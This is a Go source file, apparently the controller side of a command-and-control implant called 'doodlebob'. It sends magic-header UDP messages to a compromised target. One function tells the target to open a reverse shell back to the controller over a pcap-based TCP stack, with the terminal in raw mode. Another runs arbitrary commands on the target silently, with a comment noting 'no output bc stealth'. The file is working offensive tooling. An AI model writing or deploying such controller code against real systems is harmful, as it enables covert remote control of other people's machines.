// Contains the backend logic for the controller cli
package cli

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/netip"
	"os"
	"os/signal"
	"strconv"
	"time"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/pkg/network"
	"github.com/MeHungr/pcapnet"
	"golang.org/x/term"
)

// prependHeaderAndSend adds the magic header to the beginning of the message and sends it
func prependHeaderAndSend(msg *message.Message, conn net.Conn) error {
	// Add the magic header to the message
	jsonPayload, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("encoding message: %w", err)
	}
	payload := append(message.MagicHeader, jsonPayload...)

	// Send json payload
	if _, err := conn.Write(payload); err != nil {
		return fmt.Errorf("writing UDP payload: %w", err)
	}

	return nil
}

// Heartbeat sends a heartbeat to the host and waits for a response
func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
	// Join the IP and port
	addr := net.JoinHostPort(udpTarget, targetPort)

	listener, err := net.ListenPacket("udp", ":"+srcPort)
	if err != nil {
		return fmt.Errorf("opening shell listener: %w", err)
	}
	defer listener.Close() // Close listener when function returns

	errChan := make(chan error, 2)
	doneChan := make(chan struct{})

	// Listen for heartbeat concurrently
	go func() {
		buf := make([]byte, 1024)
		// ReadFrom blocks until a UDP packet arrives
		n, addr, err := listener.ReadFrom(buf)
		if err != nil {
			errChan <- fmt.Errorf("reading from connection: %w", err)
			return
		}

		message := string(buf[:n])
		fmt.Printf("Received heartbeat from %q: %s\n", addr.String(), message)
		close(doneChan) // Signal successful completion
	}()

	// Dial the target with udp to send heartbeat request
	go func() {
		targetAddr, err := net.ResolveUDPAddr("udp", addr)
		if err != nil {
			errChan <- fmt.Errorf("resolving target: %w", err)
			return
		}

		msg := &message.Message{
			Type:    message.Heartbeat,
			DstIP:   targetIP,
			DstPort: targetPort,
			SrcIP:   srcIP,
			SrcPort: srcPort,
			Data:    "",
		}

		jsonPayload, err := json.Marshal(msg)
		if err != nil {
			errChan <- fmt.Errorf("encoding message: %w", err)
			return
		}

		payload := append(
			append([]byte(nil), message.MagicHeader...),
			jsonPayload...,
		)

		_, err = listener.WriteTo(payload, targetAddr)
		if err != nil {
			errChan <- fmt.Errorf("sending heartbeat: %w", err)
		}
	}()

	// Handle synchronization and errors safely
	select {
	case err := <-errChan:
		return fmt.Errorf("heartbeat failed: %w", err)
	case <-doneChan:
		return nil // Success
	}
}

// OpenShell opens a listener on the control host for a reverse shell from the target
func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
	srcPort := rand.Intn(45000) + 10000

	// Fix: LocalIP() returns a net.IP, not host:port — SplitHostPort would always error.
	srcIP := network.LocalIP().String()

	// Parse the expected inner target port that the agent will connect back to
	innerListenPort, err := strconv.Atoi(targetPort)
	if err != nil {
		return fmt.Errorf("invalid target port %s: %w", targetPort, err)
	}

	// ========= PCAP TCP STACK ==========
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	setupCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	pool, err := netip.ParsePrefix("172.16.0.0/16")
	if err != nil {
		return fmt.Errorf("invalid subnet: %w", err)
	}

	virtualIP, err := netip.ParseAddr("172.16.0.1")
	if err != nil {
		return fmt.Errorf("invalid virtual IP: %w", err)
	}

	addr := network.LocalIP().IP
	localIP, ok := netip.AddrFromSlice(addr)
	if !ok {
		return fmt.Errorf("could not convert local IP to netip.Addr")
	}

	device, err := network.GetNetworkInterface(addr)
	if err != nil {
		return fmt.Errorf("invalid interface: %w", err)
	}

	udpCfg := pcapnet.UDPConfig{
		DeviceName:     device.Name,
		LocalIP:        localIP,
		LocalPort:      uint16(srcPort),
		ReserveUDPPort: true,
	}
	serverCfg := pcapnet.ServerConfig{
		VirtualIP:   virtualIP,
		AddressPool: pool,
		MTU:         1200,
		MaxPeers:    1,
	}

	// FIXED: Pass innerListenPort (the port the target connects to) instead of srcPort
	listener, err := pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, innerListenPort)
	if err != nil {
		return fmt.Errorf("opening shell listener: %w", err)
	}
	defer listener.Close()
	// ========= PCAP TCP STACK ==========

	portStr := strconv.Itoa(srcPort)
	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
		return fmt.Errorf("sending shell message: %w", err)
	}

	// Fix: Accept in a goroutine so ctx cancellation can unblock us.
	// listener.Close() (via defer or ctx goroutine) will cause Accept to return.
	type connResult struct {
		conn net.Conn
		err  error
	}
	ch := make(chan connResult, 1)
	go func() {
		c, e := listener.Accept()
		ch <- connResult{conn: c, err: e}
	}()

	// Unblock Accept on ctx cancellation by closing the listener.
	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	var res connResult
	select {
	case res = <-ch:
	case <-ctx.Done():
		return ctx.Err()
	}

	if res.err != nil {
		// Distinguish a clean shutdown from a real error.
		if ctx.Err() != nil {
			return ctx.Err()
		}
		return fmt.Errorf("accepting connection: %w", res.err)
	}

	conn := res.conn
	defer conn.Close()

	fmt.Printf("[+] Target connected from %s!\nOpening doodlebob terminal >:3\n", conn.RemoteAddr())

	// Put the terminal into raw mode only for PTY shell types.
	var oldState *term.State
	switch shellType {
	case message.ShellNativePty, message.ShellPcapPty:
		oldState, err = term.MakeRaw(int(os.Stdin.Fd()))
		if err != nil {
			return fmt.Errorf("setting raw terminal: %w", err)
		}
	}

	// restoreTerminal is idempotent and safe to call multiple times.
	restoreTerminal := func() {
		if oldState != nil {
			_ = term.Restore(int(os.Stdin.Fd()), oldState)
			oldState = nil
		}
	}
	defer restoreTerminal()

	// disconnected is closed when the remote side hangs up.
	disconnected := make(chan struct{})

	// Close conn if ctx is cancelled so io.Copy unblocks.
	go func() {
		select {
		case <-ctx.Done():
			conn.Close()
		case <-disconnected:
		}
	}()

	// Remote → local stdout.
	go func() {
		_, _ = io.Copy(os.Stdout, conn)
		fmt.Print("\r\n[-] Target disconnected.\r\n")
		close(disconnected)
	}()

	// Local stdin → remote.
	// Fix: use io.Copy instead of a manual read loop with a busy-polling default branch.
	// io.Copy blocks in Read, so it yields the thread properly and carries no spin cost.
	go func() {
		_, _ = io.Copy(conn, os.Stdin)
	}()

	// Block until the session ends, then let defers clean up properly.
	// Fix: removed os.Exit — defers now fire correctly for term restore and conn/listener close.
	select {
	case <-disconnected:
		fmt.Print("\r")
	case <-ctx.Done():
	}

	// Restore the terminal before returning so the prompt is usable.
	restoreTerminal()
	return nil
}

// sendShell sends a shell message to the target host
func sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort string, shellType message.ShellType) error {
	// Join the IP and port
	addr := net.JoinHostPort(udpTarget, targetPort)

	// Dial the target with udp
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return fmt.Errorf("connecting to client: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Create message struct
	msg := &message.Message{
		Type:    message.MessageType(shellType),
		DstIP:   targetIP,
		DstPort: targetPort,
		SrcIP:   srcIP,
		SrcPort: srcPort,
		Data:    "",
	}

	// Add the magic header and send the message. Returns any errors from this function
	return prependHeaderAndSend(msg, conn)
}

// SendCommand sends a command to the target host
// There is no output bc stealth
// udpTarget is the target for the UDP packet
// targetIP is the target of the command
func SendCommand(udpTarget, targetIP, port string, cmd string) error {
	// Join the IP and port
	addr := net.JoinHostPort(udpTarget, port)

	// Dial the target with udp
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return fmt.Errorf("connecting to client: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Create message struct
	msg := &message.Message{
		Type:    message.Command,
		DstIP:   targetIP,
		DstPort: port,
		Data:    cmd,
	}

	// Add the magic header and send the message. Returns any errors from this function
	return prependHeaderAndSend(msg, conn)
}
